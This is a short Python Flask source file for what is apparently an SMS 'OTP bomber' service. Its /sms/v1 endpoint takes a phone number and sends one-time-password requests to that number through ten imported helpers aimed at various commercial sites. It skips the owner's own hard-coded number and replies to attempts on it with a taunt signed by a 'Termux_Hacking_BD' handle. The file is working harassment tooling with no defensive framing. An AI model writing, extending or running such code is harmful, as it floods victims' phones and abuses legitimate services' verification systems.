from flask import Blueprint, jsonify, request
from additional.apis import (
    send_bioscope_otp, send_bikroy_otp, send_redx_otp,
    send_ecourier_otp, send_fundesh_otp, send_osudpotro_otp,
    send_rokomari_otp, gp_otp, bing_otp, check_otp
)

api_bp = Blueprint('api', __name__)

# Health check route
@api_bp.route('/status')
def status():
    return jsonify(status="API is running")

# Blocked number list
BLOCKED_NUMBERS = ['01621756366']

#localhost/sms/v1?num=017******
@api_bp.route('/sms/v1', methods=['GET'])
def send_otp():
    number = request.args.get('num')
    if not number:
        return jsonify({'error': 'No number provided'}), 400

    # 🔒 Block this number from sending OTPs
    if number in BLOCKED_NUMBERS:
        return jsonify({'error': f'WTF \n you want to try owner number \n @Termux_Hacking_BD_0'}), 403

    success_count = 0
    failed_count = 0

    for api_call in [
        send_bioscope_otp, send_bikroy_otp, send_redx_otp,
        send_ecourier_otp, send_fundesh_otp, send_osudpotro_otp,
        send_rokomari_otp, gp_otp, bing_otp, check_otp
    ]:
        status_code = api_call(number)
        if status_code == 200:
            success_count += 1
        else:
            failed_count += 1

    return jsonify({
        'number': number,
        'success_count': success_count,
        'failed_count': failed_count
    }), 200
